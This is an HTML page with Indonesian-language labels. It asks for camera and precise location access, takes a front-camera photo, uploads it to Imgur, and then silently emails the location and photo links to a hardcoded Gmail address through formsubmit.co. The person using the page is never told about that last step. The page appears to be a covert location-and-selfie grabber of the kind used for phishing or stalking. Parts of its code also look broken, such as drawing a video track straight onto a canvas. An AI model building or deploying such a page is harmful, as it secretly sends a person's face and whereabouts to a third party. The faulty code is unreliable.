<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kirim Lokasi & Foto Link</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        #preview {
            max-width: 90%;
            max-height: 50vh;
            border: 2px solid #0f0;
            display: none;
            margin-bottom: 10px;
        }
        #btn {
            padding: 15px 20px;
            background: #0f0;
            color: #000;
            font-weight: bold;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        #status {
            margin-top: 15px;
            font-size: 14px;
            color: #fff;
            text-align: center;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0f0;
            border-radius: 50%;
            width: 15px;
            height: 15px;
            animation: spin 1s linear infinite;
            display: inline-block;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <img id="preview" alt="Preview">
    <button id="btn">📷 KAPTURE & KIRIM LINK</button>
    <div id="status">Siap</div>

    <script>
        const btn = document.getElementById('btn');
        const preview = document.getElementById('preview');
        const status = document.getElementById('status');

        btn.addEventListener('click', async () => {
            status.innerHTML = 'Meminta izin... <span class="spinner"></span>';
            btn.disabled = true;

            try {
                // 1. Akses Kamera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                preview.srcObject = stream;
                await new Promise(r => setTimeout(r, 500)); // Tunggu stream stabil

                // 2. Ambil Lokasi
                status.innerHTML = 'Mengambil lokasi... <span class="spinner"></span>';
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000
                    });
                });
                
                const lat = pos.coords.latitude;
                const lng = pos.coords.longitude;
                const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;

                // 3. Tangkap Gambar
                status.innerHTML = 'Menangkap gambar... <span class="spinner"></span>';
                const canvas = document.createElement('canvas');
                canvas.width = stream.getVideoTracks()[0].videoWidth;
                canvas.height = stream.getVideoTracks()[0].videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(stream.getVideoTracks()[0], 0, 0);

                // Konversi ke Base64 untuk diupload ke Imgur
                const base64Image = canvas.toDataURL('image/jpeg').split(',')[1];

                // Hentikan stream
                stream.getTracks().forEach(track => track.stop());

                // 4. Upload ke Imgur
                status.innerHTML = 'Mengupload ke Imgur... <span class="spinner"></span>';
                const response = await fetch('https://api.imgur.com/3/image', {
                    method: 'POST',
                    headers: {
                        Authorization: 'Client-ID 11193391855259b' // Client ID Imgur Publik
                    },
                    body: base64Image
                });

                const data = await response.json();

                if (data.success) {
                    const imgLink = data.data.link;
                    status.innerHTML = `✅ Selesai! <br> Foto: <a href="${imgLink}" target="_blank" style="color:#0f0">${imgLink}</a><br> Lokasi: <a href="${mapLink}" target="_blank" style="color:#0f0">Google Maps</a>`;
                    
                    // Tampilkan preview
                    preview.style.display = 'block';
                    preview.src = `data:image/jpeg;base64,${base64Image}`;

                    // Kirim Email dengan Link
                    kirimEmail(mapLink, imgLink);
                } else {
                    throw new Error('Gagal upload Imgur');
                }

            } catch (error) {
                status.innerHTML = `❌ Error: ${error.message}`;
                btn.disabled = false;
            }
        });

        function kirimEmail(mapLink, imgLink) {
            const formData = new FormData();
            formData.append('message', `Lokasi: ${mapLink}\nFoto Link: ${imgLink}\nWaktu: ${new Date().toISOString()}`);
            
            fetch('https://formsubmit.co/ajax/desamuncrat477@gmail.com', {
                method: 'POST',
                body: formData
            }).then(() => {
                console.log('Email terkirim');
            }).catch(err => console.error(err));
        }
    </script>
</body>
</html>
